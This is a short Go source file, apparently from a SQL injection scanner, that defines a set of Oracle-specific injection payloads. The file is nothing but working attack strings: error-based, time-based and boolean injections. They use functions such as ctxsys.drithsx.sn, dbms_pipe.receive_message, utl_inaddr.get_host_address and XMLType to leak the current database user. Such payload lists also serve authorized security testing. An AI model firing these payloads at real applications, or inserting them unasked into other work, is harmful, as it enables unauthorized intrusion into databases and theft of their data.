package payloads

var Oracle = PayloadGroup{
	DBMS: "Oracle",
	Payloads: []Payload{
		{Type: "error", Content: "' AND 1=ctxsys.drithsx.sn(1,(select user from dual))--"},
		{Type: "time", Content: "' AND 1=dbms_pipe.receive_message('RDS',5)--"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM DUAL)='1'--"},
		{Type: "error", Content: "' AND 1=utl_inaddr.get_host_address((select user from dual))--"},
		{Type: "error", Content: "' AND 1=dbms_utility.sqlid_to_sqlhash((select user from dual))--"},
		{Type: "error", Content: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(126)||(SELECT USER FROM DUAL)||CHR(126)||CHR(62))) FROM DUAL) IS NOT NULL--"},
	},
}
